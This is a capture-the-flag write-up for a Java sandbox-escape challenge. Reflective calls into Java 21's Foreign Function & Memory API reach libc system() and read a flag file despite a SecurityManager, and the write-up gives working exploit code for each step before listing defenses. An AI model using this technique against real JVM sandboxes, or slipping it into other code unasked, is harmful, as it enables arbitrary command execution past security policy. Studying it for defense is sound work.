# Snaking

**Category:** Pwn / Sandbox Escape
**Flag:** `SAS{test_flag}`

## Challenge

The service asks for a base64-encoded, zlib-compressed JAR, writes it to a
temporary file, and launches a Python wrapper with that JAR on the classpath:

```python
jar_source = decompress(b64decode(input("JAR source: ").strip().encode()))
...
run(
    ["python3", "main.py", "--url", url_arg] +
    (["--proxy", proxy_arg] if proxy_arg else []),
    stderr=STDOUT,
    env=os.environ.copy() | {"CLASSPATH": jar_path},
    check=True,
)
```

`main.py` then starts PyJNIus with a Java SecurityManager and an empty policy:

```python
jnius_config.add_options(
    '-Djava.security.manager',
    '-Djava.security.policy==restrict.policy',
    '-Djava.security.properties=jnius.security',
    '-Xbootclasspath/a:/usr/local/lib/python3.12/dist-packages/jnius/src',
    '-Xmx256m'
)
```

The interesting part is that all `requester.*` classes are loaded from our
JAR:

```python
HttpClient = autoclass("requester.HttpClient")
RequestBuilder = autoclass("requester.Request$Builder")
```

So the intended API surface is trusted by the Python side, but implemented by
the attacker.

## Recon

The obvious first attempt is to read `/app/flag.txt` from Java:

```java
Files.readString(Path.of("/app/flag.txt"));
```

That fails because the challenge policy is empty:

```text
java.security.AccessControlException:
  access denied ("java.io.FilePermission" "/app/flag.txt" "read")
```

The same restriction blocks the normal Java escape hatches:

- `Runtime.getRuntime().exec(...)`
- `System.setSecurityManager(null)`
- `Field.setAccessible(true)`
- reflective access to `sun.misc.Unsafe`
- `AccessController.doPrivileged(...)` with a synthetic permissive context

PyJNIus also exposes a Python proxy object for `requester.ProxyAuthenticator`
when proxy credentials are supplied, and the process prints a libc base leak:

```python
def gift():
    """ Should've brute-forced 12 bits, but I'm feeling nice today :P """
    with open("/proc/self/maps", "r") as f:
        for line in f:
            if "libc.so.6" in line:
                print("Gift:", f'0x{line.split("-")[0]}')
                break
```

This initially suggests a native PyJNIus exploit, but there is a much cleaner
Java 21 issue.

## Vulnerability

The container uses OpenJDK 21. Java 21 includes the Foreign Function & Memory
API under `java.lang.foreign`.

Even with the SecurityManager active, these classes are reachable reflectively:

```java
Class<?> linkerClass = Class.forName("java.lang.foreign.Linker");
Object linker = linkerClass.getMethod("nativeLinker").invoke(null);
```

`Linker.nativeLinker()` gives access to native symbols, and
`downcallHandle(...)` creates a `MethodHandle` for calling them. This bypasses
Java's `FilePermission` checks because the actual file read is performed by a
native process spawned through libc, not by Java's file APIs.

No preview bytecode is needed. The exploit compiles with `--release 17` and
uses reflection to access the Java 21 API at runtime.

## Exploitation

### 1. Implement the trusted `requester.*` API

The Python code expects these classes and methods:

- `requester.HttpClient`
- `requester.HttpClient$Builder`
- `requester.Request`
- `requester.Request$Builder`
- `requester.Response`
- `requester.ProxyAuthenticator`

The malicious client only needs to satisfy the method calls made by `main.py`.
The exploit runs when Python calls:

```python
resp = client.newCall(req).execute()
```

Our `Call.execute()` triggers the sandbox escape:

```java
public class Call {
    public Response execute() {
        FFM.catFlag();
        return new Response();
    }
}
```

### 2. Resolve libc `system`

The payload obtains the process-native linker and default symbol lookup:

```java
Class<?> linkerClass = Class.forName("java.lang.foreign.Linker");
Class<?> symbolLookupClass = Class.forName("java.lang.foreign.SymbolLookup");

Object linker = linkerClass.getMethod("nativeLinker").invoke(null);
Object lookup = linkerClass.getMethod("defaultLookup").invoke(linker);
Optional<?> systemSymbol = (Optional<?>) symbolLookupClass
        .getMethod("find", String.class)
        .invoke(lookup, "system");
Object systemAddress = systemSymbol.orElseThrow();
```

Then it builds a function descriptor for:

```c
int system(char *cmd);
```

```java
Object javaInt = valueLayoutClass.getField("JAVA_INT").get(null);
Object address = valueLayoutClass.getField("ADDRESS").get(null);
Object argumentLayouts = Array.newInstance(memoryLayoutClass, 1);
Array.set(argumentLayouts, 0, address);

Object descriptor = functionDescriptorClass
        .getMethod("of", memoryLayoutClass, argumentLayouts.getClass())
        .invoke(null, javaInt, argumentLayouts);
```

Finally, it creates the downcall handle:

```java
Object options = Array.newInstance(optionClass, 0);
MethodHandle system = (MethodHandle) linkerClass
        .getMethod("downcallHandle", memorySegmentClass,
                functionDescriptorClass, options.getClass())
        .invoke(linker, systemAddress, descriptor, options);
```

### 3. Call `system("cat /app/flag.txt")`

The command string is allocated as a native UTF-8 string through an automatic
arena:

```java
Object arena = arenaClass.getMethod("ofAuto").invoke(null);
String command = "cat /app/flag.txt";
Object cString = arenaClass
        .getMethod("allocate", long.class, long.class)
        .invoke(arena, command.length() + 1L, 1L);
memorySegmentClass
        .getMethod("setUtf8String", long.class, String.class)
        .invoke(cString, 0L, command);
```

Then the downcall executes libc `system`:

```java
system.invokeWithArguments(cString);
```

The SecurityManager emits a warning about restricted native access, but it does
not block the call:

```text
WARNING: A restricted method in java.lang.foreign.Linker has been called
WARNING: java.lang.foreign.Linker::downcallHandle has been called by the unnamed module
```

The flag is printed to stdout before the fake HTTP response:

```text
SAS{test_flag}
Response code: 200
Response body: ok
```

## Running

Generate the JAR payload:

```sh
python3 artifacts/solve.py > payload.txt
```

Send `payload.txt` as `JAR source`, provide any URL, and leave `--proxy` empty:

```text
--url: http://example.com
--proxy:
```

## Flag

```
SAS{test_flag}
```

## Lessons / Defenses

- **Do not rely on SecurityManager for modern sandboxing** — it is deprecated
  and increasingly brittle around newer JVM features.
- **Disable native access explicitly** — FFM downcalls should not be reachable
  inside a sandboxed plugin boundary.
- **Do not load attacker-controlled classes into trusted namespaces** — the
  Python wrapper treats `requester.*` as a benign HTTP client, but the entire
  implementation comes from attacker-controlled bytecode.
- **Use OS-level isolation** — seccomp/AppArmor/gVisor/firecracker-style
  isolation would have blocked or contained the native `system` call even when
  the JVM-level policy missed it.

## Artifacts

- [`artifacts/solve.py`](artifacts/solve.py) — self-contained payload generator
- [`artifacts/snaking_55c3cd400b83d56e39f29155f11d1b0d.zip`](artifacts/snaking_55c3cd400b83d56e39f29155f11d1b0d.zip) — original challenge archive

Challenge archive SHA-256:

```text
97ba27503dad0d911a70851da3d09cb98283ddb179fe49c39bd19bcc1a63c8f1
```
